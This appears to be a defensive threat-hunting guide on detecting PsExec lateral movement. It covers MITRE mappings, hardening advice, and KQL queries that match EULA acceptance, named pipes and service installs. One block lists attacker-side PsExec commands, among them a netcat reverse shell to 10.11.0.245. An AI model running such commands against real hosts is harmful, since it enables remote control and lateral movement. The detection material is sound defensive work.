# PSEXEC
### EXECUTIVE SUMMARY
PsExec is a set of tools that aid administrators in managing their systems by remotely issuing commands. It is meant to be a modern, light-weight replacement for remote administration tools like telnet and WMIC. PsExec has provided administrators with a reliable method for remotely accessing systems via the Server Message Block (SMB) protocol without having to manually install client software. By default, PsExec will install itself to a hidden SMB share drive on the remote computer at $ADMIN. Some of its most powerful uses include launching full interactivity command prompts on remote systems and remote-enabling tools that otherwise do not have the ability to show information about remote systems. Once an adversary has a foothold on the network, they may leverage these mechanisms to execute malicious content and do lateral movement. PsExec has been used by many threat actors, including Emotet and Qbot. 

### HYPOTHESIS
The objective of this threat hunt is to do basic detection of PsExec activity for further evaluation. We are looking for 4 different types of activity. 
1.	Initial EULA acceptance command.
2.	PSEXESVC.exe installed on the victim device (indicating that PSEXEC has been accepted and installed on the local system).
3.	Looking for pipe usage related to PSEXEC and well-known clones on remote machines. 

## MITRE ATT&CK
### Software:
 - PsExec https://attack.mitre.org/software/S0029/ 
### Tactics:
 - Execution https://attack.mitre.org/tactics/TA0002/ 
 - Lateral Movement https://attack.mitre.org/tactics/TA0008/ 
### Techniques:
 - Remote Services https://attack.mitre.org/techniques/T1021/ 
 - Remote Services: SMB/Windows Admin Shares https://attack.mitre.org/techniques/T1021/002/ 
 - System Services https://attack.mitre.org/techniques/T1569/ 
 - System Services: Service Execution https://attack.mitre.org/techniques/T1569/002/ 

## TECHNICAL SUMMARY
### OVERVIEW
PsExec allows remote command execution (and receipt of resulting output) over a named pipe with the Server Message Block (SMB) protocol, which runs on TCP port 445. The credentials supplied to PsExec for authentication must have elevated privileges on the targeted client machine. PsExec tool requires that the executable be present on the system performing the administration or attack, but no additional software is necessary on target clients. 

### THREAT DESCRIPTION 
The standard PsExec activity:
1. Authenticate to the target host over SMB using either the current logon session or supplied credentials.
2. Copy the service executable file PSEXECSVC.EXE to the target system’s ADMIN$ share.
3. Connect to the service control manager on the target host to install and start PSEXESVC.
4. Facilitate input/output via the named pipe \\.\pipe\psexesvc
5. Apon completion, Uninstall the service and delete the service executable.

A pipe for PsExec communication usually looks like "\\.\pipe\psexesvc." When searching for malicious uses of PsExec in the environment, even an evasive, renamed version of PsExec will still use named pipes to communicate. This behavior is predictable enough that it can be found in other software that merely clones the functionality of PsExec.

If looking to verify that PsExec has been used on a device, check for the Windows Registry artifact "KEY_CURRENT_USER\software\sysinternals\psexec\eulaaccepted." If the registry exists and has a DWORD value of "0x00000001," then you know that the EULA has been accepted while running PsExec.

POTENTIAL MALICIOUS COMMAND EXAMPLES:
```
Examples PSEXEC commands from attacker’s side:
Launches an interactive command prompt on the remote computer \\companylaptop:
psexec -i \\companylaptop cmd

Executes IpConfig on the remote computer:
psexec -i \\companylaptop ipconfig /all

Copies the program test.exe to the remote computer and executes:
psexec -i \\companylaptop -c test.exe

Accept EULA so end user doesn't see it and run reverse shell:
psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
```

### PREVENTION RECOMMENDATIONS
As with any preventive action, investigating the viability of PSEXEC abuse is essential before implementing it so that legitimate usage is not affected. Disabling the service will prevent it from being used by threat actors and admins alike.

 - Deploy Windows Local Administrator Password Policy: Per Microsoft, Windows Local Administrator Password Solution (LAPS) is a Windows feature that backs up the password of local administrator accounts within Azure Active Directory and Windows Active Directory-joined devices. This allows administrators to prevent the reuse of local administrator passwords across devices. By extending the schema of Active Directory, each endpoint configured would generate a unique password and be stored within Active Directory to be retrieved as needed. Implementing LAPS reduces the attack surface when an adversary compromises a single set of local credentials, preventing their use across multiple endpoints. Since Admin Shares require administrative permissions, LAPS can help limit local account usage across the environment.
 - Restrict Service Accounts from being able to: log on locally, log on through Remote Desktop Services, limit who can access Admin Shares.
 - Disable the Lanman Server service: This service enables support for file, print, and named pipe sharing over the network. This might be too extreme in most environments. 
 - Block SMB connections inbound: for more information, see https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a 
 - Disable administrative/hidden shares: Within GPO or by directly modifying the registry, you can disable the shares with a simple registry modification.

```
To disable Admin Shares on a workstation, the key is:
HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
DWORD Name = AutoShareWks
Value = 0

To disable Admin Shares on a server, the key is:
HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
DWORD Name = AutoShareServer
Value = 0
```

### MITIGATION RECOMMENDATIONS
•	Any account displaying malicious activity should have the password changed and ensure MFA is enforced.
•	Look for any other devices the user has had contact with (logged into) since the known breach and investigate those devices for malicious activity and files.
•	Isolate the device from the network and investigate for other malicious activity or files.
•	The tool requires credentials and network access to target hosts. Because this is rarely seen as an “opening move” or initial access in an attack, detection of malicious PsExec activity is likely one piece of a larger attack chain, and a thorough investigation should be conducted.

### References 
1.	https://ss64.com/nt/psexec.html 
2.	https://www.praetorian.com/blog/threat-hunting-how-to-detect-psexec/ 
3.	https://learn.microsoft.com/en-us/sysinternals/downloads/psexec 
4.	https://threatexpress.com/redteaming/tool_ioc/psexec/ 
5.	https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PsExec.htm 
6.	https://www.ired.team/offensive-security/lateral-movement/lateral-movement-with-psexec 
7.	https://www.mindpointgroup.com/blog/lateral-movement-with-psexec 
8.	https://redcanary.com/blog/threat-detection/threat-hunting-psexec-lateral-movement/ 
9.	https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/ 
10.	https://attack.mitre.org/software/S0029/ 
11.	https://attack.mitre.org/tactics/TA0002/ 
12.	https://attack.mitre.org/tactics/TA0008/ 
13.	https://attack.mitre.org/techniques/T1021/ 
14.	https://attack.mitre.org/techniques/T1021/002/ 
15.	https://attack.mitre.org/techniques/T1569/ 
16.	https://attack.mitre.org/techniques/T1569/002/
17.	https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview



# KQL: 
```kql
// look for accepting the EULA to turn on PSEXEC (must be done first time PSEXEC is turned on)
// this should only be used in environments where PSEXEC is not expected
// this will be an early warning that PSEXEC is being used and may indicate lateral movement
// accepteula suppresses the display of the license dialog 
let PSEXECaccepteula = @'(.*)psexec(\.exe)?(.*)accepteula(.*)';
let lookbacktime = 90d;
let DEvent = DeviceEvents
| where TimeGenerated >= ago(lookbacktime)
| where InitiatingProcessCommandLine matches regex PSEXECaccepteula or ProcessCommandLine matches regex PSEXECaccepteula
;
let DPEvent = DeviceProcessEvents
| where TimeGenerated >= ago(lookbacktime)
| where InitiatingProcessCommandLine matches regex PSEXECaccepteula or ProcessCommandLine matches regex PSEXECaccepteula
;
let DFEvent = DeviceFileEvents
| where TimeGenerated >= ago(lookbacktime)
| where InitiatingProcessCommandLine matches regex PSEXECaccepteula
;
DPEvent
| join kind=fullouter (DFEvent) on TimeGenerated
| join kind=fullouter (DEvent) on TimeGenerated
| extend TimeGenerated = coalesce(TimeGenerated, TimeGenerated1, TimeGenerated2)
| extend DeviceName = coalesce(DeviceName, DeviceName1, DeviceName2)
| extend AccountName = coalesce(AccountName, AccountName1)
| extend InitiatingProcessAccountName = coalesce(InitiatingProcessAccountName, InitiatingProcessAccountName1, InitiatingProcessAccountName2)
| extend InitiatingProcessAccountUpn = coalesce(InitiatingProcessAccountUpn, InitiatingProcessAccountUpn1, InitiatingProcessAccountUpn2)
| extend ProcessCommandLine = coalesce(ProcessCommandLine, ProcessCommandLine1)
| extend InitiatingProcessCommandLine = coalesce(InitiatingProcessCommandLine, InitiatingProcessCommandLine1, InitiatingProcessCommandLine2)
| extend Type = coalesce(Type, Type1, Type2)
```
Looking for PsExec initial setup. This could be indicative of lateral movement happening in the network. If PsExec is not normal or expected in the network or if it is being used to reach out to the internet and download suspicious things then the client should be notified. 
This is looking for accepting the EULA to turn on PSEXEC (must be done first time PSEXEC is turned on). This should only be used in environments where PSEXEC is not expected. This will be an early warning that PSEXEC is being used and may indicate lateral movement. accepteula suppresses the display of the license dialog.

```kql
// looking for pipe usage related to PSEXEC on the remote machine
// or one of the many clones that exist out there
// will need research to validate what PSEXEC is being used to do
let PSEXESVC = @'(.*)\\\\.\\pipe\\(psexesvc|paexec|remcom_comunication|csexecsvc)(.*)'
;
let lookbacktime = 90d;
DeviceEvents
| where TimeGenerated >= ago(lookbacktime)
| where InitiatingProcessCommandLine matches regex PSEXESVC or ProcessCommandLine matches regex PSEXESVC 
```
Looking for pipe usage related to PSEXEC on the remote machine or one of the many clones that exist out there. psexesvc, paexec, remcom_comunication, csexecsvc

This will need research to validate what PSEXEC or a clone is being used to do.

```kql
// looking for the presence of PSEXEC installed on the device
// this should only be used in environments where PSEXEC is not expected
// this will not show failled attempts to use PSEXEC
DeviceFileEvents
| where TimeGenerated >= ago(90d)
| where FolderPath contains "\\ADMIN$\\PSEXESVC.EXE"
| where ActionType == "FileCreated"
| where AdditionalFields !contains "error"
// ALT looking for the service in events
//Event
//| where TimeGenerated >= ago(90d)
//| where EventID == 7045
//| extend ServiceName = trim_end(@"(\s)(Service File Name:)(\s)(.+)" , extract(@"(Service Name:)(\s)(.+)", 3, RenderedDescription))
//| where ServiceName contains "psexe"
```
Looking for the presence of PSEXEC installed on the device. This should only be used in environments where PSEXEC is not expected. This will not show failed attempts to use PSEXEC prevented by permissions.
